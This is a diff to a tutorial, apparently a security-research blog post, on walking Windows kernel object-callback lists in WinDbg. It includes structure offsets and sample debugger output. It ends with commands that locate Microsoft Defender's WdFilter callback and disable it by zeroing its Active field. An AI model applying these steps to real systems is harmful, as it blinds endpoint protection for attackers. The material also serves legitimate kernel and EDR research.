@@ -190,13 +190,15 @@ Callbacks are stored per object type in a **linked list** inside `_OBJECT_TYPE`.
 +0x0C8  CallbackList     — LIST_ENTRY head of all registered callbacks
 ```
 
-`CALLBACK_ENTRY_ITEM` (each node in the list, 64 bytes):
+`CALLBACK_ENTRY_ITEM` (each node in the list):
 ```
-+0x000  EntryItemList   — LIST_ENTRY (Flink/Blink to navigate)
-+0x010  Operations      — DWORD: 1=create handle, 2=duplicate, 3=both
-+0x014  Active          — DWORD: 1=enabled, 0=disabled  ← patch this
-+0x028  PreOperation    — callback function address
-+0x030  PostOperation   — callback function address (or NULL)
++0x000  EntryItemList        — LIST_ENTRY (Flink/Blink to navigate)
++0x010  Operations           — DWORD: 1=create handle, 2=duplicate, 3=both
++0x014  Active               — DWORD: 1=enabled, 0=disabled  ← patch this
++0x018  CallbackRegistration — pointer to parent registration block
++0x020  ObjectType           — pointer back to owning _OBJECT_TYPE
++0x028  PreOperation         — callback function address
++0x030  PostOperation        — callback function address (or NULL)
 ```
 
 ![ObRegisterCallbacks linked list — CALLBACK_ENTRY_ITEM chain with Active field](/assets/images/callbacks-ob-linked-list.svg)
@@ -223,49 +225,68 @@ To list all type names:
 ## Step 2 — Check the Callback List
 
 ```
-dt nt!_OBJECT_TYPE ffffbf0f`e469c650
+dt nt!_OBJECT_TYPE ffff8c03`bac8d0c0
+dt nt!_OBJECT_TYPE ffff8c03`bac9f7a0
 ```
 
-Look at `+0xC8 CallbackList`. If `Flink == Blink == the address of CallbackList itself`, the list is empty and no Ob callbacks are registered for this type. Otherwise `Flink` points to the first `CALLBACK_ENTRY_ITEM`.
+Look at `+0xC8 CallbackList`. The list is a standard Windows doubly-linked circular list. The head is the `CallbackList` field itself, embedded inside `_OBJECT_TYPE` at `type_addr + 0xC8`. An empty list points to itself — `Flink == Blink == type_addr + 0xC8`.
 
-**Example output:**
+**Example output — Process (non-empty):**
 ```
-nt!_OBJECT_TYPE @ ffffbf0f`e469c650
+dt nt!_OBJECT_TYPE ffff8c03`bac8d0c0
    +0x010 Name         : _UNICODE_STRING "Process"
-   +0x0c8 CallbackList :
-      Flink : ffffd380`a234f8c0   ← first node (save this)
-      Blink : ffffd380`a25f5a30
+   +0x028 Index        : 0x7
+   +0x0c8 CallbackList : _LIST_ENTRY [ 0xffffa180`7454c980 - 0xffffa180`7454c980 ]
 ```
+`ffff8c03bac8d0c0 + 0xC8 = ffff8c03bac8d188`. Flink is `ffffa1807454c980` — different from `ffff8c03bac8d188` → **non-empty**, one callback node at `ffffa1807454c980`. Save that address.
+
+**Example output — Thread (empty):**
+```
+dt nt!_OBJECT_TYPE ffff8c03`bac9f7a0
+   +0x010 Name         : _UNICODE_STRING "Thread"
+   +0x028 Index        : 0x8
+   +0x0c8 CallbackList : _LIST_ENTRY [ 0xffff8c03`bac9f868 - 0xffff8c03`bac9f868 ]
+```
+`ffff8c03bac9f7a0 + 0xC8 = ffff8c03bac9f868`. Flink equals that address → **empty**, no callbacks registered for Thread on this system. Stop here for Thread.
+
+> **Trap:** Do not dump `dq type_addr+0xC8 L7` when the list is empty. Doing so reads straight into adjacent `_OBJECT_TYPE` fields beyond the `CallbackList` LIST_ENTRY. Those pointers look like addresses but are unrelated structure data — `lm a` will return nothing because they are not callback functions.
 
 ## Step 3 — Read the Callback Node
 
 ```
-dq ffffd380`a234f8c0 L7
+dq ffffa180`7454c980 L7
 ```
 
-Reads the raw 56-byte `CALLBACK_ENTRY_ITEM`. Map the output to the offsets above: `+0x14` is `Active`, `+0x28` is `PreOperation`.
+Maps directly onto `CALLBACK_ENTRY_ITEM` offsets:
 
-**Example output:**
 ```
-ffffd380`a234f8d0  00000001`00000003   ← Active=1 (upper DWORD), Operations=3 (lower)
-ffffd380`a234f8e0  ffffbf0f`e468b450  fffff804`42faf2b0   ← ObjectType, PreOperation
+ffffa180`7454c980  ffff8c03`bac8d188 ffff8c03`bac8d188   ← +0x000 Flink, +0x008 Blink
+                                                            both = head → only 1 node in list
+ffffa180`7454c990  00000001`00000003 ffffa180`7454c960   ← +0x010 Ops=3, +0x014 Active=1
+                                                            +0x018 CallbackRegistration*
+ffffa180`7454c9a0  ffff8c03`bac8d0c0 fffff805`42ee2ea0   ← +0x020 ObjectType*, +0x028 PreOperation
+ffffa180`7454c9b0  00000000`00000000                     ← +0x030 PostOperation = NULL
 ```
+
+Note that `Flink == Blink == ffff8c03bac8d188` here means this is the **only node** and it points back to the head — not that the list is empty. The empty check applies to the **head** (inside `_OBJECT_TYPE`), not to nodes.
+
+`+0x10` is a QWORD: the lower DWORD (`00000003`) is `Operations`, the upper DWORD (`00000001`) is `Active`. The `lm a fffff80542ee2ea0` → WdFilter confirms Defender's handle-stripping callback.
 
 ## Step 4 — Identify and Disable
 
 ```
-lm a fffff804`42faf2b0
+lm a fffff805`42ee2ea0
 ```
 
-Then write `0` to the `Active` field at `node + 0x14`:
+Identifies the driver that owns this callback (WdFilter). Then write `0` to the `Active` field at `node + 0x14`:
 
 ```
-eb (ffffd380`a234f8c0 + 0x14) 0
+eb (ffffa180`7454c980 + 0x14) 0
 ```
 
 The kernel checks `Active` before invoking `PreOperation`. Setting it to `0` disables the callback without removing the node — the list remains intact, no crash risk.
 
-Walk to the next node by following `Flink` at `+0x000`. Stop when `Flink` equals the `CallbackList` head address from Step 2 — that means you've gone around the full list.
+Walk to the next node by following `Flink` at `+0x000` of each node. Stop when `Flink` equals `type_addr + 0xC8` (the head address) — you have gone around the full list.
 
 ---
 
